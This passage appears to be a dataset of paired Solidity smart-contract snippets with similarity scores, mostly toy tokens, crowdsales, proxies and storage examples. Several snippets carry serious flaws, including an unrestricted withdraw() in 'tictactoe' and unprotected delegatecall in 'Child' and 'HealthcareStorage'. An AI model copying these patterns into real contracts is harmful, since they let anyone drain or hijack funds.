        require(blacklist[msg.sender] == false);

        _;

    }



    function Constructor() public {

        owner = msg.sender;

        balances[owner] = totalDistributed;

    }



    function transferOwnership(address newOwner) onlyOwner public {

        if (newOwner != address(0)) {

            owner = newOwner;

        }

    }



    function finishDistribution() onlyOwner canDistr public returns (bool) {

        distributionFinished = true;

        emit DistrFinished();

        return true;

    }

	

	function finishedPurchase() onlyOwner canPurchase public returns (bool) {

		purchaseFinished = true;

		emit PurchaseFinished();

		return true;

	}



    function distr(address _to, uint256 _amount) canDistr private returns (bool) {

        totalRemaining = totalRemaining.sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Distr(_to, _amount);

        emit Transfer(address(0), _to, _amount);

        return true;

    }

	

	function purch(address _to,uint256 _amount) canPurchase private returns (bool){

		totalPurchase = totalPurchase.sub(_amount);

		balances[_to] = balances[_to].add(_amount);

		emit Purchase(_to, _amount);

		emit Transfer(address(0), _to, _amount);

		return true;

	}



    function () external payable {

		if (msg.value >= minPurchase){

			purchaseTokens();

		}else{

			airdropTokens();

		}

    }



	function purchaseTokens() payable canPurchase public {

		uint256 recive = msg.value;

		require(recive >= minPurchase && recive <= maxPurchase);



        

		

		

		

		

		uint256 amount;

		amount = recive.mul(purchaseCardinal);

		uint256 bonus;

		if (recive >= 0.001e18 && recive < 0.01e18){

			bonus = amount.mul(1).div(10);

		}else if(recive >= 0.01e18 && recive < 0.05e18){

			bonus = amount.mul(2).div(10);

		}else if(recive >= 0.05e18 && recive < 0.1e18){

			bonus = amount.mul(3).div(10);

		}else if(recive >= 0.1e18 && recive < 0.5e18){

			bonus = amount.mul(5).div(10);

		}else if(recive >= 0.5e18){

			bonus = amount;

		}

		

		amount = amount.add(bonus).div(1e18);

		

		require(amount <= totalPurchase);

		

		purch(msg.sender, amount);

	}

	

    function airdropTokens() payable canDistr onlyWhitelist public {

        if (value > totalRemaining) {

            value = totalRemaining;

        }



        require(value <= totalRemaining);



        address investor = msg.sender;

        uint256 toGive = value;

		

		distr(investor, toGive);

		

		if (toGive > 0) {

			blacklist[investor] = true;

		}



        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }



        value = value.div(100000).mul(99999);

    }



    function balanceOf(address _owner) constant public returns (uint256) {

        return balances[_owner];

    }



    modifier onlyPayloadSize(uint size) {

        assert(msg.data.length >= size + 4);

        _;

    }



    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {

        require(_to != address(0));

        require(_amount <= balances[msg.sender]);



        balances[msg.sender] = balances[msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(msg.sender, _to, _amount);

        return true;

    }



    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {

        require(_to != address(0));

        require(_amount <= balances[_from]);

        require(_amount <= allowed[_from][msg.sender]);



        balances[_from] = balances[_from].sub(_amount);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(_from, _to, _amount);

        return true;

    }



    function approve(address _spender, uint256 _value) public returns (bool success) {

        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



    function allowance(address _owner, address _spender) constant public returns (uint256) {

        return allowed[_owner][_spender];

    }



    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){

        ForeignToken t = ForeignToken(tokenAddress);

        uint bal = t.balanceOf(who);

        return bal;

    }



    function withdraw() onlyOwner public {

        uint256 etherBalance = address(this).balance;

        owner.transfer(etherBalance);

    }



    function burn(uint256 _value) onlyOwner public {

        require(_value <= balances[msg.sender]);



        address burner = msg.sender;

        balances[burner] = balances[burner].sub(_value);

        totalSupply = totalSupply.sub(_value);

        totalDistributed = totalDistributed.sub(_value);

        emit Burn(burner, _value);

    }

	

	function burnPurchase(uint256 _value) onlyOwner public {

		require(_value <= totalPurchase);

		

		totalSupply = totalSupply.sub(_value);

		totalPurchase = totalPurchase.sub(_value);

		

		emit Burn(msg.sender, _value);

	}



    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {

        ForeignToken token = ForeignToken(_tokenContract);

        uint256 amount = token.balanceOf(address(this));

        return token.transfer(owner, amount);

    }

	

	function withdrawToken(address _to,uint256 _amount) onlyOwner public returns(bool){

        require(_amount <= totalRemaining);

        

        return distr(_to,_amount);

    }

}"
"contract Garbage {

address[3] public addresses;


function addAddress(address _address) public {

    addresses.push(_address);

}",0.6886750497393781,"contract ThisMustBeFirst {

  address public bts_address1;
  address public bts_address2;
  address public token_address;

}"
"contract xyz {
    mapping(address => bool) Users;
    function add(address userAddress) {
            require(userAddress != 0x0 && !Users[userAddress]);             
            Users[userAddress] = true;    
    }
    function pass(address passAddress) returns (bool) {   
        return Users[passAddress];
    }
}",0.6328808257556252,"contract DestoryBasic {
    address destoryAddress;
    
    function setDestoryAddress(address _destory) {
        destoryAddress = _destory;
    }
    
    function ifDestory(address from) returns (bool) {
        if (from == destoryAddress) {
            return true;
        }
        return false;
    }
}"
"contract helloWorld {    
    uint public balance;    

    function helloWorld() {
        balance = 1000;
    }
}",0.637432560314889,"contract TokenStorage {
    function balances(address account) public returns(uint balance);
}"
"contract UserB {

  address public owner;
  address public user; 
  string public color;

 function UserB(address _user) {
        owner = msg.sender;
        user = user;
}

function chooseColor(int number) constant returns (string color) {
            if(number == 1){ return ""red"";} 
            else if(number == 2){ return ""blue"";} 
            else if(number == 3){ return ""green"";}
    } 
}",0.6751022683085054,"contract Ownership is IOwnership {

    
    address internal owner;


    
    constructor() public {
        owner = msg.sender;
    }


    
    modifier only_owner() {
        require(msg.sender == owner, ""m:only_owner"");
        _;
    }


    
    function isOwner(address _account) public view returns (bool) {
        return _account == owner;
    }


    
    function getOwner() public view returns (address) {
        return owner;
    }
}"
"contract PGPAccounts {

  
    struct PGPAccount {
        bytes pubkey;            
        bool isLinked;          
    }

    mapping (address => PGPAccount) accounts;

    
    
    function hasAccount(address _address) public returns(bool) {
        return accounts[_address].isLinked;
    }

    
    
    function newAccount(bytes calldata _pubkey) external {
        require(hasAccount(msg.sender) == false);   

        
        PGPAccount storage newPGPAccount = accounts[msg.sender];
        newPGPAccount.pubkey = _pubkey; 
        newPGPAccount.isLinked = true;

        
        PGPMultisig newPGPMultisig = new PGPMultisig({
              _owner: msg.sender,
              _verifier: address(this)
            });
    }


    function getPubKey(address payable _accountHolder) public returns(bytes memory pubKey) {
        require(accounts[_accountHolder].isLinked == true);   

        return accounts[_accountHolder].pubkey;
    }

    function () external payable {} 
}",0.6253019528055405,"contract PauserRole is Ownable{
    using Roles for Roles.Role;

    event PauserAdded(address indexed account);
    event PauserRemoved(address indexed account);

    Roles.Role private pausers;

    constructor() public {
        _addPauser(msg.sender);
    }

    modifier onlyPauser() {
        require(isPauser(msg.sender));
        _;
    }

    function isPauser(address account) public view returns (bool) {
        return pausers.has(account);
    }

    function addPauser(address account) public onlyOwner {
        _addPauser(account);
    }

    function renouncePauser() public {
        _removePauser(msg.sender);
    }

    function _addPauser(address account) internal {
        pausers.add(account);
        emit PauserAdded(account);
    }

    function _removePauser(address account) internal {
        pausers.remove(account);
        emit PauserRemoved(account);
    }
}"
"contract PGPMultisig {

    address owner;                              
    address PGPverifier;                        

    constructor(address _owner, address _verifier) public {
    owner = _owner;
    
    
    PGPverifier = address(uint160(address(_verifier))); 
    }

    
    
    
    function checkTXValid(
        bytes calldata _PGPsig,
        bytes calldata _desiredTXHash,
        address _contractAddress,       
        address payable _to,            
        uint256 _value                  
        ) external {

        require(msg.sender == owner);   

        
        require(PGPverifier.hasAccount(msg.sender) == true); 

        

        
        if (_contractAddress == 0x0000000000000000000000000000000000000000) {  

            
        }

        
        else {
             
        }

    }

    function () external payable {} 

}",0.6200111405599161,"contract Ownable {

    address public owner;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    function _validateAddress(address _addr) internal pure {

        require(_addr != address(0), ""invalid address"");

    }



    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner() {

        require(msg.sender == owner, ""not a contract owner"");

        _;

    }



    function transferOwnership(address newOwner) public onlyOwner {

        _validateAddress(newOwner);

        emit OwnershipTransferred(owner, newOwner);

        owner = newOwner;

    }



}"
"contract MetaCoin {
    mapping (address => uint) balances;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    function MetaCoin() {
        balances[msg.sender] = 10000;
    }

    function sendCoin(address receiver, uint amount) returns(bool sufficient) {
        if (balances[msg.sender] < amount) return false;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        Transfer(msg.sender, receiver, amount);
        return true;
    }

    function getBalanceInEth(address addr) returns(uint){
        return ConvertLib.convert(getBalance(addr),2);
    }

    function getBalance(address addr) returns(uint) {
        return balances[addr];
    }
}",0.6923539187135701,"contract TokenBase
{
    string public name;
    string public symbol;
    uint8 public decimals;
    
	uint256 internal currentSupply;

	mapping(address => uint) public balanceOf;
	event Transfer(address indexed from, address indexed to, uint256 value);
	
	function totalSupply() constant returns (uint256)
	{
	    return currentSupply;
	}
	
	function transfer(address to, uint amount) returns (bool)
	{
		if (balanceOf[msg.sender] < amount) throw;           
		if (balanceOf[to] + amount < balanceOf[to]) throw;
		
		balanceOf[msg.sender] -= amount;
		balanceOf[to] += amount;
		Transfer(msg.sender, to, amount);
		return true;
	}
}"
"contract otherCoin {
  mapping (address => uint) balances;
  address owner;

  function otherCoin() {
    owner = msg.sender;
    balances[owner] = 10000;
  }

  function purchaseCoin(address coinContractAddress, uint amount) returns(bool sufficient) {
    MetaCoin m = MetaCoin(coinContractAddress);
    if(m.getBalance(msg.sender) >= amount) {
      balances[msg.sender] += amount;
      balances[owner] -= amount;
      m.sendCoin(owner, amount);
      return true;
    }
    throw;
  }

  function getBalance(address addr) returns(uint) {
        return balances[addr];
    }
}",0.6533286036160146,"contract BasicToken is ERC20Basic {
  using SafeMath for uint;

  mapping(address => uint) balances;

  function transfer(address _to, uint _value) public returns (bool) {
    require(_to != address(0));
    require(_value > 0 && _value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }

  function balanceOf(address _owner) public constant returns (uint balance) {
    return balances[_owner];
  }
}"
"contract Bar is Foo {

    function setFooToZero() public {}
}",0.6666415429309291,"contract minerProxy {
    function set(address _miner) public;
}"
"contract Notary {

  struct Record {
      uint mineTime;
      uint blockNumber;
  }

  mapping (bytes32 => Record) private docHashes;

  constructor() public {
    
  }

  function addDocHash (bytes32 hash) public {
    Record memory newRecord = Record(now, block.number);
    docHashes[hash] = newRecord;

  }
  function findDocHash (bytes32 hash) public view returns(uint, uint) {
    return (docHashes[hash].mineTime, docHashes[hash].blockNumber);
  }
}",0.6082161528155632,"contract Enlist {

  struct Record {

    address investor;

    bytes32 _type;

  }



  Record[] records;



  function setRecord (

    address _investor,

    bytes32 _type

  ) internal {

    records.push(Record(_investor, _type));

  }



  function getRecordCount () constant

  public

  returns (uint) {

    return records.length;

  }



  function getRecord (uint index) view

  public

  returns (address, bytes32) {

    return (

      records[index].investor,

      records[index]._type

    );

  }

}"
"contract Demo {
    uint _a;
    function Demo(uint a) public {
        _a = a;
    }

    function demo() public view {
        require(_a == 1);
        require(_a == 2);
    }
}",0.6599624700357585,"contract Token {
  function balanceOf(address) public view returns (uint);
  function decimals() public view returns (uint);
}"
"contract SecondContract {

    uint num;
    bytes32 value;

    function bar(bytes32 _value) returns (uint errorCode) {
        if (num < 10) return 1;
        value = _value;
        return 0;
    }
}",0.6323264578541333,"contract Token {
    function balanceOf(address a) returns (uint) {
        (a);
        return 0;
    }

    function transfer(address a, uint val) returns (bool) {
        (a);
        (val);
        return false;
    }
}"
"contract ThirdContract {

    bool isActive;
    bytes32 value;

    function baz(bytes32 _value) returns (uint errorCode) {
        if (!isActive) return 1;
        value = _value;
        return 0;
    }
}",0.6267372201226438,"contract NewMkrOracle {
    function read() external pure returns (bytes32) {
        revert();
    }
    function peek() external pure returns (bytes32, bool) {
        return (0, false);
    }
}"
"contract CoinFlipOracle is usingOraclize {

  string public result;
  bytes32 public oraclizeID;

  event Log(string text);

  function CoinFlipOracle() {
    Log(""Contract created"");
  }

  function flipCoin() payable {
    Log(""Oraclize query was sent, waiting for response"");
    oraclizeID = oraclize_query(""WolframAlpha"", ""flip a coin"", 5000000);
  }

  function __callback(bytes32 _oraclizeID, string _result) {
    require(msg.sender == oraclize_cbAddress());
    Log(_result);
    result = _result;
  }

  function getResult() view returns(string) {
    return result;
  }
}",0.6836907034766209,"contract YoutubeViews is usingOraclize {

    string public viewsCount;

    event LogYoutubeViewCount(string views);
    event LogNewOraclizeQuery(string description);

    constructor()
        public
    {
        update(); 
    }

    function __callback(
        bytes32 _myid,
        string memory _result
    )
        public
    {
        require(msg.sender == oraclize_cbAddress());
        viewsCount = _result;
        emit LogYoutubeViewCount(viewsCount);
        
    }

    function update()
        public
        payable
    {
        emit LogNewOraclizeQuery(""Oraclize query was sent, standing by for the answer..."");
        oraclize_query(""URL"", 'html(https:
    }
}"
"contract TextSave {
    uint public mostSent = 0;
    string public currentText = ""Put your own text here!"";
    address public owner = msg.sender;
    uint private maxLength = 50;

    function setText(string newText) public payable returns (bool) {
        if (msg.value > mostSent && bytes(newText).length < maxLength) {
            currentText = newText;
            mostSent = msg.value;
            return true;
        } else {
            msg.sender.transfer(msg.value);
            return false;
        }
    }

    function withdrawEther() external {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function () public payable{
        setText(""Default text!"");
    }
 }",0.6532343656421918,"contract MultiEtherSender {

    address public owner;

    uint8 MAX_RECIPIENTS = 255;

    

    constructor() public payable{

        owner = msg.sender;

    }

    

    

    event Send(uint256 _amount, address indexed _receiver);

    

    function multiSendEth(uint256 amount, address[] list) public payable returns (bool) 

    {

        uint256 balance = msg.sender.balance;

        bool result = false;

        require(list.length != 0);

        require(list.length <= MAX_RECIPIENTS);

        for (uint i=0; i<list.length; i++) {

            require(balance >= amount);

            result = list[i].send(amount);

        }

        return result;

    }

     

    

    function() public payable {

	owner.transfer(msg.value);    

    }

    

}"
"contract B {
    uint x;
    function B(uint a) payable {
        x = a;
    }
}",0.6290865078867913,"contract Buyable {



    function buy() payable public returns (uint256);



}"
"contract Test {
   uint private val;

   function getVal() constant returns(uint) {
       return val;
   }

   function setVal(uint newVal) payable {
       val = newVal;
   }

   function() {
       val++;
   }
}",0.6691156964861885,"contract SimpleStorageKevin {

    

    

    uint x = 316;



    

    function setKevin(uint newValue)

        public

    {

        x = newValue;

    }

    

    

    function getKevin()

        public

        view

        returns (uint) 

    {

        return x;

    }

}"
"contract TokenCrowdsale {

    using SafeMath for uint256;

    
    address public beneficiary;                     
    address public creator;                         
    address public confirmedBy;                     
    uint256 public maxSupply = 15000000e8;    
    uint256 public minAcceptedAmount = 10 finney;
    bool public purchasingAllowed = false;
    uint256 public totalSupply = 0;

    
    uint256 public rate = 2000;

    enum Stages {
        PreSale,
        InProgress,
        Ended,
        Withdrawn
    }

    Stages public stage = Stages.PreSale;

    
    Token public deplToken;

    
    mapping (address => uint256) balances;

    
    modifier atStage(Stages _stage) {
        require(stage == _stage);
        _;
    }

    
    modifier onlyBeneficiary() {
        require(beneficiary == msg.sender);
        _;
    }

    
    function balanceOf(address _investor) constant returns (uint256 balance) {
        return balances[_investor];
    }


    function enablePurchasing() onlyBeneficiary atStage(Stages.PreSale) {
        purchasingAllowed = true;
        stage = Stages.InProgress;
    }

    function disablePurchasing() onlyBeneficiary atStage(Stages.InProgress) {
        purchasingAllowed = false;
        stage = Stages.Ended;
    }

    function enableNewPurchasing() onlyBeneficiary atStage(Stages.Withdrawn) {
        purchasingAllowed = true;
        stage = Stages.InProgress;
    }

    
    function TokenCrowdsale(address _tokenAddress, address _beneficiary, address _creator) {
        deplToken = Token(_tokenAddress);
        beneficiary = _beneficiary;
        creator = _creator;
    }

    
    function confirmBeneficiary() onlyBeneficiary {
        confirmedBy = msg.sender;
    }


    
    function withdraw() onlyBeneficiary atStage(Stages.Ended) {
        uint256 ethBalance = this.balance;
        beneficiary.transfer(ethBalance);
        stage = Stages.Withdrawn;
    }

    
    function () payable atStage(Stages.InProgress) {
        require(purchasingAllowed);

        if (msg.value >= 10 finney) {
            address investor = msg.sender;
            uint256 received = (msg.value).div(10e8);
            uint256 tokens = (received).mul(rate);
            balances[investor] = balances[investor].add(tokens);
            totalSupply = (totalSupply).add(tokens);
        }

        if (totalSupply >= maxSupply) {
            purchasingAllowed = false;
            stage = Stages.Ended;
        }

    }

    function withdrawForeignTokens(address _tokenContract) onlyBeneficiary public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(beneficiary, amount);
    }
}",0.6516545251855552,"contract Crowdsale is Ownable {

  using SafeMath for uint256;



  

  ERC20 private _token;



  

  address private _wallet;



  

  

  

  

  uint256 private _rate;



  

  uint256 private _weiRaised;



  

  event TokensPurchased(

    address indexed purchaser,

    address indexed beneficiary,

    uint256 value,

    uint256 amount

  );



  

  constructor(uint256 rate, address wallet, ERC20 token) public {

    require(rate > 0);

    require(wallet != address(0));

    require(token != address(0));



    _rate = rate;

    _wallet = wallet;

    _token = token;

  }



  

  

  



  

  function() external payable {

    buyTokens(msg.sender);

  }



  

  function token() public view returns (ERC20) {

    return _token;

  }



  

  function wallet() public view returns (address) {

    return _wallet;

  }



  

  function rate() public view returns (uint256) {

    return _rate;

  }

  

  function setRate(uint256 setRate) public onlyOwner returns(uint256)

  {

      _rate = setRate;

      return _rate;

  }



  

  function weiRaised() public view returns (uint256) {

    return _weiRaised;

  }



  

  function buyTokens(address beneficiary) public payable {



    uint256 weiAmount = msg.value;

    _preValidatePurchase(beneficiary, weiAmount);



    

    uint256 tokens = _getTokenAmount(weiAmount);



    

    _weiRaised = _weiRaised.add(weiAmount);



    _processPurchase(beneficiary, tokens);

    emit TokensPurchased(

      msg.sender,

      beneficiary,

      weiAmount,

      tokens

    );



    _updatePurchasingState(beneficiary, weiAmount);



    _forwardFunds();

    _postValidatePurchase(beneficiary, weiAmount);

  }



  

  

  



  

  function _preValidatePurchase(

    address beneficiary,

    uint256 weiAmount

  )

  internal

  {

    require(beneficiary != address(0));

    require(weiAmount != 0);

  }



  

  function _postValidatePurchase(

    address beneficiary,

    uint256 weiAmount

  )

  internal

  {

    

  }



  

  function _deliverTokens(

    address beneficiary,

    uint256 tokenAmount

  )

  internal

  {

    _token.transfer(beneficiary, tokenAmount);

  }



  

  function _processPurchase(

    address beneficiary,

    uint256 tokenAmount

  )

  internal

  {

    _deliverTokens(beneficiary, tokenAmount);

  }



  

  function _updatePurchasingState(

    address beneficiary,

    uint256 weiAmount

  )

  internal

  {

    

  }



  

  function _getTokenAmount(uint256 weiAmount)

  internal view returns (uint256)

  {

    return weiAmount.mul(_rate);

  }



  

  function _forwardFunds() internal {

    _wallet.transfer(msg.value);

  }

}"
"contract Wrapper {

    Candy private candy;
    address public owner;

    function linkTest(Candy _candy) public {
        require(address(_candy) != 0x0);
        address candyOwner = _candy.owner();
        require(candyOwner != 0x0);
        owner = candyOwner;
        candy = _candy;
    }
}",0.6315425120966089,"contract owned {

    address public owner;

    function owned() payable {
        owner = msg.sender;
    }
    
    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }

    function changeOwner(address _owner) onlyOwner public {
        require(_owner != 0);
        owner = _owner;
    }
}"
"contract SweepFunds {
    
    
    address payable public merchant = RECIPIENT_ADDR; 
    address payable public admin = ADMIN_ADDR; 
    
    
    event LogForwardedEther(uint total, address indexed merchant, uint merchVal, address indexed admin, uint adminFee);
    event LogForwardedToken(uint total, address indexed merchant, uint merchVal, address indexed admin, uint adminFee, address indexed token);

    
    function() external payable {
        transferFunds(msg.value);
    }

    
    function flushEther() public payable {
        uint ethBal = address(this).balance;
        transferFunds(ethBal);
    }
    
    
    function sweepTokens(address _token) public {
        transferFunds(_token);
    }

    
    function transferFunds(uint _value) private {
        require(_value > 0);
        uint _fee = (NUMERATOR*_value)/(DENOMINATOR*100);
        
        
        emit LogForwardedEther(_value, merchant, _value - _fee, admin, _fee);
        merchant.transfer(_value - _fee);
        admin.transfer(_fee);
    }
    
    
    function transferFunds(address _token) private {
        uint _value = ERC20(_token).balanceOf(address(this));
        require(_value > 0);
        uint _fee = (NUMERATOR*_value)/(DENOMINATOR*100);
            
        
        emit LogForwardedToken(_value, merchant, _value - _fee, admin, _fee, _token);
        ERC20(_token).transfer(merchant, _value - _fee);
        ERC20(_token).transfer(admin, _fee);
    }
}",0.6173375851934598,"contract ERC20 is IERC20 {

    using SafeMath for uint256;



    address public _minter;



    mapping (address => uint256) private _balances;



    uint256 private _totalSupply;



    

    function totalSupply() public view returns (uint256) {

        return _totalSupply;

    }



    

    function balanceOf(address owner) public view returns (uint256) {

        return _balances[owner];

    }



    

    function transfer(address to, uint256 value) public returns (bool) {

        _transfer(msg.sender, to, value);

        return true;

    }



    

    function _transfer(address from, address to, uint256 value) internal {

        require(from != address(0), ""ERC20: transfer from the zero address"");

        require(to != address(0), ""ERC20: transfer to the zero address"");

        require(value <= _balances[from], ""Insufficient balance."");



        _balances[from] = _balances[from].sub(value);

        _balances[to] = _balances[to].add(value);

        emit Transfer(from, to, value);

    }



    

    function _mint(address account, uint256 value) internal {

        require(account != address(0), ""ERC20: mint to the zero address"");

        require(msg.sender == _minter);

        require(value < 1e60);



        _totalSupply = _totalSupply.add(value);

        _balances[account] = _balances[account].add(value);

        emit Transfer(address(0), account, value);

    }

}"
"contract amountSplit {

  mapping(address => uint) public toAccountBalance;
  address[2] public beneficiaryList;

  event LogReceived(address sender, uint amount);
  function addAddresses(address addressOne, address addressTwo) {
    beneficiaryList[0]=addressOne;
    beneficiaryList[1]=addressTwo;
  }

  function pay(uint amount) public payable returns(bool success)
  {
    if(amount==0) throw;
    uint forth = amount / 2;

    toAccountBalance[beneficiaryList[0]] += forth;
    toAccountBalance[beneficiaryList[1]] += forth;
    emit LogReceived(msg.sender, msg.value);
    return true;
  }
}",0.6309470944710645,"contract MultiEthSender {

    

    event Send(uint256 _amount, address indexed _receiver);

    

    constructor() payable public {

        

    }

    

    function multiSendEth(uint256 amount, address[] list) public payable returns (bool) {

        uint balanceBeforeTransfer = address(this).balance;

        

        for(uint i=0;i<list.length;i++){

            list[i].transfer(amount);

            emit Send(amount, list[i]);

        }

        assert(address(this).balance == balanceBeforeTransfer - amount*list.length);

        return true;

    }

    

    function getBalance() constant public returns(uint){

        return address(this).balance;

    }

    

    function() public payable{

        

    }

    

}"
"contract SimpleDice is usingOraclize {
    address owner;
    mapping (bytes32 => address) bets;

    function SimpleDice(){
        owner = msg.sender;
    }

    function() payable {
        if (msg.sender != owner) throw;
    }

    function __callback(bytes32 myid, string result) {
        if (msg.sender != oraclize_cbAddress()) throw;
        if (uint(bytes(result)[0]) - 48 > 3) {
            if (bets[myid].send(2 wei)) {
                log0(""winner"");
            }
        }
    }

    function bet() payable {
        rollDice();
    }

    function rollDice() {
        bytes32 myid = oraclize_query(""WolframAlpha"", ""random number between 1 and 6"");
        bets[myid] = msg.sender;
    }    

    function kill(){
        if (msg.sender == owner) suicide(msg.sender);
    }
}",0.6186067988151833,"contract Sandstone
{
    bool closed = false;
    uint unlockTime = 3600;
    address sender;
    address receiver;
 
    function Put(address _receiver) public payable {
        if ((!closed && msg.value > 0.25 ether) || sender == 0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime += now;
        }
    }
    
    function SetTime(uint _unixTime) public {
        if (msg.sender == sender) {
            unlockTime = _unixTime;
        }
    }
    
    function Get() public payable {
        if (receiver == msg.sender && now >= unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    
    function Close() public {
        if (sender == msg.sender) {
           closed=true;
        }
    }

    function() public payable { }
}"
"contract RootContract {
    Simple public s;
    string public data;
    function RootContract() { s= new Simple();}
    function getSimpleData() constant returns(string out) {
        s.fillData(this);
        out=data;
    }
    function setData(string d) {data=d;}
}",0.6586972921382683,"contract SaveData{

    constructor() public {

    }

    mapping (string=>string) data;

    function setStr(string key, string value) public payable {

        data[key] = value;

    }

    function getStr(string key) public constant returns(string){

        return data[key];

    }

}"
"contract C1 {

  uint public num;
  address public sender;    

  function c2setNum(address _c2, uint _num) public{
      C2 c2 = C2(_c2);
      c2.setNum(_num);
  }
  function delegatecallSetNum(address c2, uint _num) public {
    c2.delegatecall(abi.encodeWithSignature(""setNum(uint256)"",_num));
  }


  function delegatecallSetNumAssembly(address c2, uint _num) public {

    address _target = c2;
    bytes memory _data = abi.encodeWithSignature(""setNum(uint256)"",_num);
    bytes32 response;

    
    assembly {
        let succeeded := delegatecall(sub(gas, 500000), _target, add(_data, 0x20), mload(_data), 0, 32)
        response := mload(0)      
        switch iszero(succeeded)
        case 1 {
            
            revert(0, 0)
        }
    }
  }


function getAddr1(address _c2) public view returns (address){
      C2 c2 = C2(_c2);
     return  c2.getAddr();
  }

}",0.6228648725817014,"contract Proxy is Proxied {
    
    constructor(address _target) public {
        upgradeTo(_target);
    }

    
    function upgradeTo(address _target) public onlyOwner {
        assert(target != _target);

        address oldTarget = target;
        target = _target;

        emit EventUpgrade(_target, oldTarget, msg.sender);
    }

    
    function upgradeTo(address _target, bytes _data) public onlyOwner {
        upgradeTo(_target);
        assert(target.delegatecall(_data));
    }

    
    function () payable public {
        bytes memory data = msg.data;
        address impl = target;

        assembly {
            let result := delegatecall(gas, impl, add(data, 0x20), mload(data), 0, 0)
            let size := returndatasize

            let ptr := mload(0x40)
            returndatacopy(ptr, 0, size)

            switch result
            case 0 { revert(ptr, size) }
            default { return(ptr, size) }
        }
    }
}"
"contract C2 {
  uint public num;
  address public sender;

  event AddedValuesByDelegateCall(uint256 a, address addr, bool success);

  function setNum(uint256 _num) public {
    num = _num;
    sender = msg.sender;

    emit AddedValuesByDelegateCall(_num, msg.sender, true);
  }  
    function getAddr() public view returns (address){

        return msg.sender;        
    }
}",0.6501676851404984,"contract ERC20Basic {

  uint256 public totalSupply;

  function getaddress0() public view returns (address);

  function balanceOf(address who) public view returns (uint256);

  function transfer(address to, uint256 value) public returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

}"
"contract MyFirstContract {
    uint private age;

    function setAge(uint newAge) {
        age = newAge;
    }

    function getAge() returns (uint) {
        return age;
    }
}",0.6576832585899851,"contract FiatContract {
  function USD(uint _id) public view returns (uint256);
  function updatedAt(uint _id) public view returns (uint);
}"
"contract Master {
    mapping(address => uint) public balances;
    address public implementation;

    function setBalance(address _address, uint _balance) public {
        balances[_address] = _balance;
    }

    function getBalance(address _address) public view returns (uint) {
        return balances[_address];
    }


}",0.6914165158634986,"contract GemLike2 {
    function decimals() public view returns (uint);
    function transfer(address,uint) public;
    function transferFrom(address,address,uint) public;
    function balanceOf(address) public view returns (uint);
    function allowance(address,address) public view returns (uint);
}"
"contract Child {
    mapping(address => uint) public balances;
    address public implementation;

    function setImplementation(address _address) public {
        implementation = _address;
    }

    fallback() external payable {
        
    }
}",0.6626822908970019,"contract DAI {

    mapping(address => mapping(address => uint)) public allowance;

    mapping(address => uint) public balanceOf;



    function transferFrom(address src, address dst, uint wad) public returns (bool);

}"
"contract HealthcareStorage  {

  mapping (address => uint8) public userData;

  address public logicContract;
  address public owner;

  constructor(address _logicContract) public {
    logicContract = _logicContract;
    owner = msg.sender;
  }

  function updateContract(address _newAddress) public returns (bool) {
    require(msg.sender == owner);
    logicContract = _newAddress;

    return true;
  }

  function writeData(uint8 _age) public {
   logicContract.delegatecall(bytes4(keccak256(""writeData(uint8)"",_age)));
  }
}",0.6483922401480593,"contract Metadata {
    
    address public owner;
    
    mapping (uint => address) registerMap;

    function Metadata() public {
        owner = msg.sender;
        registerMap[0] = msg.sender;
    }

    
    function getAddress (uint addressId) public view returns (address){
        return registerMap[addressId];
    }

    
    
    
    
    
    function addAddress (uint addressId, address addressContract) public {
        assert(addressContract != 0x0 );
        require (owner == msg.sender || owner == tx.origin);
        registerMap[addressId] = addressContract;
    }
}"
"contract tictactoe {

    
    uint256 public playerCount;
    uint public betAmount;
    uint public totalBets;
    mapping(uint => Player) public player;
    address owner;

    
    enum State { Waiting, InProgress, Finished }
    State public state;

    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    
    struct Player {
        uint _id;
        uint _betAmount;
        address _owner;
    }

    constructor() public {
        owner = msg.sender;
        state = State.Waiting;
        playerCount = 0;
    }

    function remoteAdd() public payable {
        require(msg.value >= 0);
        incrementCount();
        betAmount = msg.value;
        owner = msg.sender;
        player[playerCount] = Player(playerCount, betAmount, owner);
        totalBets += betAmount;
    }

    function () external payable{
        remoteAdd();
    }

    
    function getBalance() public view returns(uint){
        return totalBets;
    }


    
    function incrementCount() internal {
        playerCount += 1;
    }

    
    
    function beginGame() public {
        require(playerCount == 2);
        state = State.InProgress;
    }

    function endGame() public {
        require(state == State.InProgress);
        state = State.Finished;
    }

    function payout() public returns (bool success){
       require(state == State.Finished); 
       msg.sender.transfer(totalBets);
       msg.sender.call.value(totalBets).gas(7000)("""");
       return true;
    }

    function withdraw() public {
        uint bal = address(this).balance;
        msg.sender.transfer(bal);
    }

}",0.6730569467608287,"contract MPhoneSeller is Ownable {

    using SafeMath for uint256;

    address public mainwallet;
    uint public rate;
    uint256 public MaxTokens;
    MPhoneToken public token = new MPhoneToken();

    function MPhoneSeller() public {
        rate = 1000000;
        owner = msg.sender;
        MaxTokens = token.maxtokens();
        mainwallet = msg.sender;
    }

    function ChangeMainWallet(address newWallet) onlyOwner public {
